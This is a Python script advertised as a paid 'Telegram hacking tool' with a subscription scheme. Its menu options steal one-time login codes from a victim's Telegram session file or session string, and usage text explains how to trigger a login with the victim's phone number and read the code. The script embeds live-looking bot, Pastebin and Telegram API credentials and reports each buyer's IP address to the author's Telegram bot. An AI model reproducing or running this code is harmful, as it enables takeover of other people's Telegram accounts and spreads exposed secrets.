import os,sys

try:
	import  telethon
except:
	os.system("pip install telethon")



#########################################################################
from telethon import TelegramClient,events,helpers
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

import datetime,time,os,sys
#########################################################################
folder = ("sessions_file")
if not os.path.exists(f"{folder}"):
	os.makedirs(f"{folder}")
def clr():
	os.system("cls" if os.name == "nt" else "clear")
#########################################################################
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
C = "\033[1;36m"
w = "\033[1;37m"
B = "\033[1;90m"
Bl = "\33[94m"
RB = "\x1b[1;41m"
RS = "\x1b[0;m"
P = "\033[1;35m"
#########################################################################
import requests,datetime,uuid,hashlib,webbrowser,random
from datetime import date,timedelta
import json
import base64,time
current_date = datetime.date.today()
#########################################################################
uuidz = str(os.getlogin()+"_u-soc")
user_id = "02".join(uuidz)
user_hash = hashlib.md5(user_id.encode('utf-8')).hexdigest().upper()
bot_id = "5858847960:AAFt3gSe8FdBhWiLPefnRBLDxl6HL-RzMVg"
chat_id = "-1001636700780"
divid = ("-"*27)
divid1 = ("-"*27)
today = date.today()
liner = "─"*65
version_u = "1.1.2"



def clr():
	os.system("cls" if os.name == "nt" else "clear")
#########################################################################
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
C = "\033[1;36m"
w = "\033[1;37m"
B = "\033[1;90m"
Bl = "\33[94m"
RB = "\x1b[1;41m"
RS = "\x1b[0;m"
P = "\033[1;35m"
#########################################################################

def loading():
    animation = ["[\x1b[1;91m●\x1b[0m□□□□□□□□□]","[\x1b[1;92m●●\x1b[0m□□□□□□□□]", "[\x1b[1;93m●●●\x1b[0m□□□□□□□]", "[\x1b[1;94m●●●●\x1b[0m□□□□□□]", "[\x1b[1;95m●●●●●\x1b[0m□□□□□]", "[\x1b[1;96m●●●●●●\x1b[0m□□□□]", "[\x1b[1;97m●●●●●●●\x1b[0m□□□]", "[\x1b[1;98m●●●●●●●●\x1b[0m□□]", "[\x1b[1;99m●●●●●●●●●\x1b[0m□]", "[\x1b[1;910m●●●●●●●●●●\x1b[0m]"]
    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(f"\r{B}● {Y}●[{B}!!{B}]{B}┌──● {Y}Checking Suscription Status " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
def loading2():
    animation = ["[\x1b[1;91m●\x1b[0m□□□□□□□□□]","[\x1b[1;92m●●\x1b[0m□□□□□□□□]", "[\x1b[1;93m●●●\x1b[0m□□□□□□□]", "[\x1b[1;94m●●●●\x1b[0m□□□□□□]", "[\x1b[1;95m●●●●●\x1b[0m□□□□□]", "[\x1b[1;96m●●●●●●\x1b[0m□□□□]", "[\x1b[1;97m●●●●●●●\x1b[0m□□□]", "[\x1b[1;98m●●●●●●●●\x1b[0m□□]", "[\x1b[1;99m●●●●●●●●●\x1b[0m□]", "[\x1b[1;910m●●●●●●●●●●\x1b[0m]"]
    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(f"\r{B}● {Y}●[{B}!!{B}]{B}┌──● {Y}Checking Update " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()

#########################################################################
key_folder = ("dont_delete_me")
if not os.path.exists(f"{key_folder}"):
	os.makedirs(f"{key_folder}")






liner = "─"*65
def loading1():
    animation = ["[\x1b[1;91m●\x1b[0m□□□□□□□□□]","[\x1b[1;92m●●\x1b[0m□□□□□□□□]", "[\x1b[1;93m●●●\x1b[0m□□□□□□□]", "[\x1b[1;94m●●●●\x1b[0m□□□□□□]", "[\x1b[1;95m●●●●●\x1b[0m□□□□□]", "[\x1b[1;96m●●●●●●\x1b[0m□□□□]", "[\x1b[1;97m●●●●●●●\x1b[0m□□□]", "[\x1b[1;98m●●●●●●●●\x1b[0m□□]", "[\x1b[1;99m●●●●●●●●●\x1b[0m□]", "[\x1b[1;910m●●●●●●●●●●\x1b[0m]"]
    for i in range(30):
        time.sleep(0.1)
        sys.stdout.write(f"\r{B}● {Y}●[{B}!!{B}]{B}┌──● {Y}Getting Last Sent Code  " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
#########################################################################
logo = f"""
████████╗   ███████╗   ██████╗  ██████╗ ████████╗™
╚══██╔══╝   ██╔════╝   ██╔══██╗██╔═══██╗╚══██╔══╝
   ██║█████╗███████╗   ██████╔╝██║   ██║   ██║   
   ██║╚════╝╚════██║   ██╔══██╗██║   ██║   ██║   
   ██║      ███████║██╗██████╔╝╚██████╔╝   ██║   
   ╚═╝      ╚══════╝╚═╝╚═════╝  ╚═════╝    ╚═╝©
╭{Y}{liner}
{B}[●●] {Y}DESCRIPTION	{B}● {Y}TELEGRAM HACKING TOOLS
{B}[●●] {Y}VERSION		{B}● {Y}1.2.0
{B}[●●] {Y}AUTHOR		{B}● {Y}DEAD SECTOR™
{B}[●●] {Y}TEAM		{B}● {Y}U-SOCIETY
{B}[●●] {Y}TELEGRAM		{B}● {Y}https://t.me/+YR2oG3IwhKdhZmE8
╰{Y}{liner}
""".replace("█",Y+"█"+B)
#########################################################################

async def main():
	await client.connect()
	messages = await client.get_messages("Telegram")
	for message in messages:
		try:
			print(f"{Y}╭{liner}")
			msg = (message.sender,message.text)
			c = str(msg)
			code_msg = c.split(",")[1].replace("**","").replace("","").replace('"',"").split(".")[0].split(":")[1]
			d = str(message.date)[0:16]
			v = d.split(" ")[0]
			x = d.split(" ")[1]
			va1,va2,va3 = int(v.split("-")[0]),int(v.split("-")[1]),int(v.split("-")[2])
			xb1,xb2 = int(x.split(":")[0]),int(x.split(":")[1])
			loading1()
			print(f"\n{B}● {Y}●[{B}√√{B}]{B}├──● {Y}Found Code {B}●{Y}{code_msg}")
			print(f"{B}● {Y}●[{B}√√{B}]{B}├──● {Y}Date It Was Sent {B}● {Y}{va1}/{va2}/{va3}")
			print(f"{B}● {Y}●[{B}√√{B}]{B}└──● {Y}Time It Was Sent {B}● {Y}{xb1}:{xb2}")
			print(f"{Y}╰{liner}")
			print(f"{Y}╭{liner}")
			print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {Y}Process Completed")
			input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Return To Menu")
			print(f"{Y}╰{liner}")
			time.sleep(1)
			menu()
		except Exception as e:
			print(f"{Y}╭{liner}")
			print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {B}Code Was Not Found")
			input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {B}Press Enter To Return To Menu")
			print(f"{Y}╰{liner}")
			time.sleep(1)
			menu()
	else:
		print("dead session")

def otp_menu():
	clr()
	global client
	print(logo)
	print(f"{Y}╭{liner}")
	print(f"{B}● {Y}●[{B}●●{B}]{B}┌─[~{Y}U-SOCIETY{B}~]")
	phone = input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Enter Session File {B}● {Y}")
	print(f"{Y}╰{liner}")
	try:
		client = TelegramClient(f"{phone}",8088717, "7d1e0295ee1c2628f1933e9ffd2d8b78")
		if not client.is_user_authorized:
			pass
	except:
		print("not autorized")
	with client:
		client.loop.run_until_complete(main())



def creat_session():
	clr()
	print(logo)
	print(f"{Y}╭{liner}")
	#phone = input(f"{B}● {Y}●[{B}++{B}]{B}┌──● {Y}Enter Your Phone Number {B}● {Y}")
	fn = input(f"{B}● {Y}●[{B}++{B}]{B}┌──● {Y}Enter A File Name{B}● {Y}")
	print(f"{Y}╰{liner}")
	try:
		with TelegramClient(StringSession(), 8088717, "7d1e0295ee1c2628f1933e9ffd2d8b78") as client:
			print(f"{Y}╰{liner}")
			clr()
			print(logo)
			print(f"{Y}╭{liner}")
			print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {Y}Your Session String [{client.session.save()}]")
			with open(fn,"w") as wt:
				wt.write(client.session.save())
		print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Session String Saved In {fn}")
		input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Return To Menu")
		time.sleep(2)
		menu()
	except Exception as e:
		print(e)
		print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Something Went Wrong")
		input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Return To Menu")
		time.sleep(2)
		menu()
		


async def main1():
	await client.connect()
	messages = await client.get_messages("Telegram")
	print(messages)
	for message in messages:
		try:
			print(f"{Y}╭{liner}")
			msg = (message.sender,message.text)
			c = str(msg)
			code_msg = c.split(",")[1].replace("**","").replace("","").replace('"',"").split(".")[0].split(":")[1]
			d = str(message.date)[0:16]
			v = d.split(" ")[0]
			x = d.split(" ")[1]
			va1,va2,va3 = int(v.split("-")[0]),int(v.split("-")[1]),int(v.split("-")[2])
			xb1,xb2 = int(x.split(":")[0]),int(x.split(":")[1])
			loading1()
			print(f"\n{B}● {Y}●[{B}√√{B}]{B}├──● {Y}Found Code {B}●{Y}{code_msg}")
			print(f"{B}● {Y}●[{B}√√{B}]{B}├──● {Y}Date It Was Sent {B}● {Y}{va1}/{va2}/{va3}")
			print(f"{B}● {Y}●[{B}√√{B}]{B}└──● {Y}Time It Was Sent {B}● {Y}{xb1}:{xb2}")
			print(f"{Y}╰{liner}")
			print(f"{Y}╭{liner}")
			print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {Y}Process Completed")
			input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Return To Menu")
			print(f"{Y}╰{liner}")
			time.sleep(1)
			menu()
		except Exception as e:
			print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {B}Code Was Not Found")
			input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {B}Press Enter To Return To Menu")
			print(f"{Y}╰{liner}")
			time.sleep(1)
			menu()
	else:
		print("dead session")

def ot_menu():
	clr()
	global client
	print(logo)
	print(f"{Y}╭{liner}")
	print(f"{B}● {Y}●[{B}●●{B}]{B}┌─[~{Y}U-SOCIETY{B}~]")
	string = input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Enter Session File {B}● {Y}")
	print(f"{Y}╰{liner}")
	try:
		client = TelegramClient(StringSession(string), 8088717, "7d1e0295ee1c2628f1933e9ffd2d8b78")
		if not client.is_user_authorized:
			pass
	except:
		print("not autorized")
	with client:
		client.loop.run_until_complete(main())



def usage():
	clr()
	print(logo)
	print(f"{Y}╭{liner}")
	print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {Y}Make Sure You Have The Target Accounts Session File")
	print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Copy the path where you store the file and paste it in termux")
	print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Now try logging in with the victims phone number...")
	print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}After 1 to 2 minutes,run the session file in the tool..")
	print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Note it works on new account best[wait for update]")
	print(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Now you're good to go.")
	print(f"{Y}╰{liner}")
	print(f"{Y}╭{liner}")
	print(f"{B}● {Y}●[{B}●●{B}]{B}┌─[~{Y}U-SOCIETY{B}~]")
	input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Return To Menu")
	print(f"{Y}╰{liner}")
	time.sleep(2)
	menu()


def menu():
	clr()
	print(logo)
	print(f"{Y}╭{liner}")
	print(f"{B}● {Y}●[{B}01{B}]{B}┌──● {Y}Steal Otp From Session File")
	print(f"{B}● {Y}●[{B}02{B}]{B}├──● {Y}Steal Otp From  Session String")
	print(f"{B}● {Y}●[{B}03{B}]{B}├──● {Y}Create Session String")
	print(f"{B}● {Y}●[{B}00{B}]{B}└──● {Y}Exit Tool")
	print(f"{Y}╰{liner}")
	while True:
		print(f"{B}● {Y}●[{B}●●{B}]{B}┌─[~{Y}U-SOCIETY{B}~]")
		Options = input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Select An Option {B}● {Y}")
		if Options =="1" or Options =="01":
			otp_menu()
		elif Options == "2" or Options == "02":
			ot_menu()
		elif Options == "3" or Options == "03":
			creat_session()
		elif Options =="4" or Options == "04":
			usage()
		elif Options == "0" or Options == "00":
			exit()
			
			
def subscription():
	clr()
	print(logo)
	print(f"{Y}╭{liner}")
	print(f"{B}● {Y}●[{B}01{B}]{B}┌──● {Y}Buy One Month(s) Suscription [$30]")
	print(f"{B}● {Y}●[{B}02{B}]{B}├──● {Y}Buy Three Month(s) Suscription [$55]")
	print(f"{B}● {Y}●[{B}02{B}]{B}├──● {Y}Buy Six Month(s) Suscription [$75]")
	print(f"{B}● {Y}●[{B}02{B}]{B}├──● {Y}Buy One Year(s) Suscription [$105]")
	print(f"{B}● {Y}●[{B}00{B}]{B}└──● {Y}Exit Tool")
	print(f"{Y}╰{liner}")
	while True:
		print(f"{B}● {Y}●[{B}●●{Y}]{B}┌──────────────────────")
		select_subs = input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Select An Option {B}● {Y}")
		if select_subs =="1" or select_subs =="01":
			print(f"{Y}╭{liner}")
			d = [29,30]
			try:
				days = random.choice(d)
				print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}Note ● If You Complete This Process Without")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Texting Me Your Key Wont Be Approved")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Text Me On ~ https://t.me/DeadSec_9")
				buyer = input(f"{B}● {Y}●[{B}++{B}]{B}├──● {Y}Enter Your Telegram Username [@user]{B}● {R}")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}U-WID [ {Y}{user_hash} {R}][PRICE ($30)]")
				input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Continue")
				##################################
				expiration_date = today + datetime.timedelta(days=int(days))
				user_info = {"name": buyer,"approval_date": str(current_date),"exp_day":str(expiration_date),"subs_duration": days}
				json_data = json.dumps(user_info)
				api_url = "https://pastebin.com/api/api_post.php"
				api_key = "vYZ4DFuxIcqY2AUWwFCWRyOU5l45qMTq"
				data = {"api_dev_key": api_key,"api_option": "paste","api_paste_code": json_data}
				response = requests.post(api_url, data=data)
				with open(f"{key_folder}/do_not_delete.api","w") as info:
					info.write(response.text)
				with open(f"{key_folder}/do_not_delete.api", 'r') as file:
					data = file.read()
				encrypted_data = base64.b64encode(data.encode())
				with open(f"{key_folder}/do_not_delete.api", 'wb') as file:
					file.write(encrypted_data)
				#with open("{key_folder}/do_not_delete.api", 'rb') as file:
					#encrypted_data = file.read()
				##################################
				ip = requests.get("https://api.ipify.org").text
				build1 = (f"{divid1}New User{divid1}\n{divid1}Ultron-Mailer{divid1}\n{divid1}Details{divid1}\nType ● One Months\nUsername ● {buyer}\nAccess Key ● {user_hash}\nInfo Url ● {response.text}\nEncrypted Url ● {encrypted_data}\nIp ● {ip}")
				url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
				send = requests.get(url).text
				print(f"{Y}╰{liner}")
				print(f"{Y}╭{liner}")
				print(f"{B}● {Y}●[{B}01{B}]{B}┌──● {R}Message Me On Telegram")
				print(f"{B}● {Y}●[{B}02{B}]{B}└──● {R}Message Me On Whatsapp")
				print(f"{Y}╰{liner}")
				message = input(f"{B}● {Y}●[{B}++{B}]{B}┌──● {Y}Sekect Option {B}● {R}")
				if message == "1" or message == "01":
					if os.name=="nt":
						webbrowser.open("https://t.me/DeadSec_9")
					else:
						os.system("xdg-open https://t.me/DeadSec_9")
					print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}THANKS")
					input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Exit")
					print(f"{Y}╰{liner}")
					time.sleep(2)
					exit()
				#################
			except ConnectionError:
				print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {R}Connection Error")
				input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Exit")
				exit()
		if select_subs =="2" or select_subs =="02":
			print(f"{Y}╭{liner}")
			d = [90,93]
			try:
				days = random.choice(d)
				print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}Note ● If You Complete This Process Without")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Texting Me Your Key Wont Be Approved")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Text Me On ~ https://t.me/DeadSec_9")
				buyer = input(f"{B}● {Y}●[{B}++{B}]{B}├──● {Y}Enter Your Telegram Username [@user]{B}● {R}")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}U-WID [ {Y}{user_hash} {R}][PRICE ($55)]")
				input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Continue")
				##################################
				expiration_date = today + datetime.timedelta(days=int(days))
				user_info = {"name": buyer,"approval_date": str(current_date),"exp_day":str(expiration_date),"subs_duration": days}
				json_data = json.dumps(user_info)
				api_url = "https://pastebin.com/api/api_post.php"
				api_key = "vYZ4DFuxIcqY2AUWwFCWRyOU5l45qMTq"
				data = {"api_dev_key": api_key,"api_option": "paste","api_paste_code": json_data}
				response = requests.post(api_url, data=data)
				with open(f"{key_folder}/do_not_delete.api","w") as info:
					info.write(response.text)
				with open(f"{key_folder}/do_not_delete.api", 'r') as file:
					data = file.read()
				encrypted_data = base64.b64encode(data.encode())
				with open(f"{key_folder}/do_not_delete.api", 'wb') as file:
					file.write(encrypted_data)
				#with open("{key_folder}/do_not_delete.api", 'rb') as file:
					#encrypted_data = file.read()
				##################################
				ip = requests.get("https://api.ipify.org").text
				build1 = (f"{divid1}New User{divid1}\n{divid1}Ultron-Mailer{divid1}\n{divid1}Details{divid1}\nType ● Three Months\nUsername ● {buyer}\nAccess Key ● {user_hash}\nInfo Url ● {response.text}\nEncrypted Url ● {encrypted_data}\nIp ● {ip}")
				url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
				send = requests.get(url).text
				print(f"{Y}╰{liner}")
				print(f"{Y}╭{liner}")
				print(f"{B}● {Y}●[{B}01{B}]{B}┌──● {R}Message Me On Telegram")
				print(f"{B}● {Y}●[{B}02{B}]{B}└──● {R}Message Me On Whatsapp")
				print(f"{Y}╰{liner}")
				message = input(f"{B}● {Y}●[{B}++{B}]{B}┌──● {Y}Sekect Option {B}● {R}")
				if message == "1" or message == "01":
					if os.name=="nt":
						webbrowser.open("https://t.me/DeadSec_9")
					else:
						os.system("xdg-open https://t.me/DeadSec_9")
					print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}THANKS")
					input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Exit")
					print(f"{Y}╰{liner}")
					time.sleep(2)
					exit()
				#################
			except ConnectionError:
				print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {R}Connection Error")
				input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Exit")
				exit()
		if select_subs =="3" or select_subs =="03":
			print(f"{Y}╭{liner}")
			d = [90,93]
			try:
				days = random.choice(d)
				print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}Note ● If You Complete This Process Without")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Texting Me Your Key Wont Be Approved")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Text Me On ~ https://t.me/DeadSec_9")
				buyer = input(f"{B}● {Y}●[{B}++{B}]{B}├──● {Y}Enter Your Telegram Username [@user]{B}● {R}")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}U-WID [ {Y}{user_hash} {R}][PRICE ($75)]")
				input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Continue")
				##################################
				expiration_date = today + datetime.timedelta(days=int(days))
				user_info = {"name": buyer,"approval_date": str(current_date),"exp_day":str(expiration_date),"subs_duration": days}
				json_data = json.dumps(user_info)
				api_url = "https://pastebin.com/api/api_post.php"
				api_key = "vYZ4DFuxIcqY2AUWwFCWRyOU5l45qMTq"
				data = {"api_dev_key": api_key,"api_option": "paste","api_paste_code": json_data}
				response = requests.post(api_url, data=data)
				with open(f"{key_folder}/do_not_delete.api","w") as info:
					info.write(response.text)
				with open(f"{key_folder}/do_not_delete.api", 'r') as file:
					data = file.read()
				encrypted_data = base64.b64encode(data.encode())
				with open(f"{key_folder}/do_not_delete.api", 'wb') as file:
					file.write(encrypted_data)
				#with open("{key_folder}/do_not_delete.api", 'rb') as file:
					#encrypted_data = file.read()
				##################################
				ip = requests.get("https://api.ipify.org").text
				build1 = (f"{divid1}New User{divid1}\n{divid1}Ultron-Mailer{divid1}\n{divid1}Details{divid1}\nType ● Six Months\nUsername ● {buyer}\nAccess Key ● {user_hash}\nInfo Url ● {response.text}\nEncrypted Url ● {encrypted_data}\nIp ● {ip}")
				url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
				send = requests.get(url).text
				print(f"{Y}╰{liner}")
				print(f"{Y}╭{liner}")
				print(f"{B}● {Y}●[{B}01{B}]{B}┌──● {R}Message Me On Telegram")
				print(f"{B}● {Y}●[{B}02{B}]{B}└──● {R}Message Me On Whatsapp")
				print(f"{Y}╰{liner}")
				message = input(f"{B}● {Y}●[{B}++{B}]{B}┌──● {Y}Sekect Option {B}● {R}")
				if message == "1" or message == "01":
					if os.name=="nt":
						webbrowser.open("https://t.me/DeadSec_9")
					else:
						os.system("xdg-open https://t.me/DeadSec_9")
					print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}THANKS")
					input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Exit")
					print(f"{Y}╰{liner}")
					time.sleep(2)
					exit()
				#################
			except ConnectionError:
				print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {R}Connection Error")
				input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Exit")
				exit()
		elif select_subs =="4" or select_subs =="04":
			print(f"{Y}╭{liner}")
			try:
				days = 365
				print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}Note ●  If You Complete This Process Without")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Texting Me Your Key Wont Be Approved")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}Text Me On ~ https://t.me/DeadSec_9")
				buyer = input(f"{B}● {Y}●[{B}++{B}]{B}├──● {Y}Enter Your Telegram Username [@user]{B}● {R}")
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {R}U-WID [ {Y}{user_hash} {R}][PRICE ($105)]")
				input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Continue")
				##################################
				user_info = {"name": buyer,"approval_date": str(current_date),"subs_duration": days}
				json_data = json.dumps(user_info)
				api_url = "https://pastebin.com/api/api_post.php"
				api_key = "vYZ4DFuxIcqY2AUWwFCWRyOU5l45qMTq"
				data = {"api_dev_key": api_key,"api_option": "paste","api_paste_code": json_data}
				response = requests.post(api_url, data=data)
				with open(f"{key_folder}/do_not_delete.api","w") as info:
					info.write(response.text)
				with open(f"{key_folder}/do_not_delete.api", 'r') as file:
					data = file.read()
				encrypted_data = base64.b64encode(data.encode())
				with open(f"{key_folder}/do_not_delete.api", 'wb') as file:
					file.write(encrypted_data)
				##################################
				ip = requests.get("https://api.ipify.org").text
				build1 = (f"{divid1}New User{divid1}\n{divid1}Ultron-Mailer{divid1}\n{divid1}Details{divid1}\nType ● One Year\nUsername ● {buyer}\nAccess Key ● {user_hash}\nInfo Url ● {response.text}\nEncrypted Url ● {encrypted_data}\nIp ● {ip}")
				url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
				send = requests.get(url).text
				print(f"{Y}╰{liner}")
				print(f"{Y}╭{liner}")
				print(f"{B}● {Y}●[{B}01{B}]{B}┌──● {R}Message Me On Telegram")
				print(f"{B}● {Y}●[{B}02{B}]{B}└──● {R}Message Me On Whatsapp")
				print(f"{Y}╰{liner}")
				message = input(f"{B}● {Y}●[{B}++{B}]{B}┌──● {Y}Sekect Option {B}● {R}")
				if message == "1" or message == "01":
					if os.name=="nt":
						webbrowser.open("https://t.me/DeadSec_9")
					else:
						os.system("xdg-open https://t.me/DeadSec_9")
					print(f"{B}● {Y}●[{B}!!{B}]{B}┌──● {R}THANKS")
					input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Press Enter To Exit")
					print(f"{Y}╰{liner}")
					time.sleep(2)
					exit()
				#################
			except ConnectionError:
				print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {R}Connection Error")
				input(f"{B}● {Y}●[{B}●{B}]{B}└──● {Y}Press Enter To Exit")
				exit()


def check_subs():
	clr()
	print(logo)
	print(f"{Y}╭{liner}")
	loading2()
	version = (f"{version_u}")
	try:
		check_v = requests.get("https://pastebin.com/raw/jT2cCth9").text
		if version == check_v:
			user_key = requests.get("https://raw.githubusercontent.com/unknown-kel/files/main/key.txt").text
			if user_hash in user_key:
				loading()
				# CHECK IF THE FILE IS AVAILABLE
				if os.path.isfile(f"{key_folder}/do_not_delete.api"):
					try:
						with open(f"{key_folder}/do_not_delete.api", 'rb') as file:
							encrypted_data = file.read()
						#DECRYPT THE FILE
						decrypted_data = base64.b64decode(encrypted_data)
						with open(f"{key_folder}/do_not_delete.api", 'w') as file:
							file.write(decrypted_data.decode())
						with open(f"{key_folder}/do_not_delete.api","r") as z:
							ck = z.read()
						split_1 = str(ck).split("com/")[0]
						split_2 = str(ck).split("/")[3]
						raw_url = f"{split_1}com/raw/{split_2}"
						
						with open(f"{key_folder}/do_not_delete.api", 'r') as file:
							data = file.read()
						encrypted_data = base64.b64encode(data.encode())
						with open(f"{key_folder}/do_not_delete.api", 'wb') as file:
							file.write(encrypted_data)
						
					except:
						build1 = (f"Url File Content Have Been Changed\n{divid1}User Key{divid1}\n{user_hash}")
						url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
						send = requests.get(url).text
						print(f"\n{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Api Key Seems Incorect")
						print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Contact Admin With Your Username [Admin @DeadSec_9]")
						input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Exit")
						exit()
					try:
						check = requests.get(raw_url).text
						cm = json.loads(check)
						name = (cm["name"])
						sub_date = (cm["approval_date"])
						sub_day = (cm["subs_duration"])
						expiration_date = (cm["exp_day"])
						result_date = today + timedelta(days=int(sub_day))
						s_expiration_date = str(expiration_date)
						cdate = str(current_date)
						syear,smonth,sday = int(s_expiration_date.split("-")[0]),int(s_expiration_date.split("-")[1]),int(s_expiration_date.split("-")[2])
						dyear,dmonth,dday = int(cdate.split("-")[0]),int(cdate.split("-")[1]),int(cdate.split("-")[2])
						days_rem = datetime.date(syear, smonth, sday) - datetime.date(dyear, dmonth, dday)
						if datetime.date.today() >= datetime.date(syear, smonth, sday):
							os.remove(f"{key_folder}/do_not_delete.api")
							build1 = (f"Key Expired\n{divid1}User Key{divid1}\n{user_hash}\n{divid1}Username{divid1}\n{name}")
							url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
							send = requests.get(url).text
							print(f"{B}● {Y}●[{B}●●{B}]{B}┌──● {R}Message Me On Telegram [@DeadSec_9]")
							renew = input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Renew Subscription{B} [y/n]● {R}").lower()
							if renew == "y":
								subscription()
							elif renew == "n":
								exit("Thanks For Using Our Script")
						elif datetime.date.today() < datetime.date(syear, smonth, sday):
							dk = str(days_rem).split(",")[0].capitalize()
							print(f"\n{B}● {Y}●[{B}●●{B}]{B}├──● {Y}User Name ● {Y}{name}")
							print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Subscription Date ● {Y}{sub_date}")
							print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Expiry Date ● {Y}{expiration_date}")
							print(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Days Left ● {R}{dk}")
							######################################
							time.sleep(3)
							menu()
					except Exception as e:
						print(f"\n{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Some Of The Files Seems Incorect")
						print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Contact Admin With Your Username [Admin @DeadSec_9]")
						input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Exit")
						exit(e)
					except Exception as e:
						print(f"{R}Error ● {e}")
				else:
					build1 = (f"Url File Deleted\n{divid1}User Key{divid1}\n{user_hash}")
					url = (f"https://api.telegram.org/bot{bot_id}/sendMessage?chat_id={chat_id}&text={build1}")
					send = requests.get(url).text
					#KEY FILE HAVE BEEN DELETED OR DETAILS HAVE BEEN CHANGED
					print(f"\n{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Seems You've Deleted Some Of The Inbuilt Files")
					print(f"{B}● {Y}●[{B}●●{B}]{B}├──● {Y}Contact Admin With Your Username [Admin @DeadSec_9]")
					input(f"{B}● {Y}●[{B}●●{B}]{B}└──● {Y}Press Enter To Exit")
					exit()
			else:
				subscription()
		else:
			print(f"\n{B}● {Y}●[{B}!!{B}]{B}├──● {R}Update Available")
			if os.name == "nt":
				print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {Y}Contact Admin For Update")
				print(f"{B}● {Y}●[{B}!!{B}]{B}└──● {Y}Follow This Link ● https://t.me/Priscydhon")
				exit()
			else:
				update = input(f"{B}● {Y}●[{B}++{B}]{B}└──● {Y}Update Tool To Continue [y/n]{B}● {Y}").lower()
				if update == "y":
					print(f"{B}● {Y}●[{B}!!{B}]{B}├──● {Y}Contact Admin For Update")
